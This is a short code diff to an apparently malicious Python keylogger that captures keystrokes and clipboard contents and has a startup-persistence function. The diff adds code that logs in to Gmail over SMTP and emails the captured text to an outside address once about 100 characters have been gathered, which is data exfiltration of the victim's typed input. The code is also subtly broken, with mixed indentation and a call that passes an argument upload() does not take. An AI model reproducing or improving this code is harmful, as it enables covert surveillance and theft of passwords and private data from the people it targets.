@@ -1,5 +1,6 @@
 import keyboard
 import pyperclip
+import smtplib 
 
 queue = ""
 last_copied = ""
@@ -19,7 +20,13 @@ def add_startup():
 
 # Remote access
 def upload():
-    print(queue)
+    global i, queue
+	s = smtplib.SMTP('smtp.gmail.com', 587) 
+	s.starttls()
+	s.login("x6432364@gmail.com", "#############")
+	s.sendmail("x6432364@gmail.com", "heellxz@gmail.com", queue) 
+	s.quit() 
+
     i = 0
     queue = ""
 
@@ -42,7 +49,7 @@ def process_event(e):
         i += len(last_copied)
 
     if i > 100:
-        upload()
+        upload(queue)
 
 
 def main():
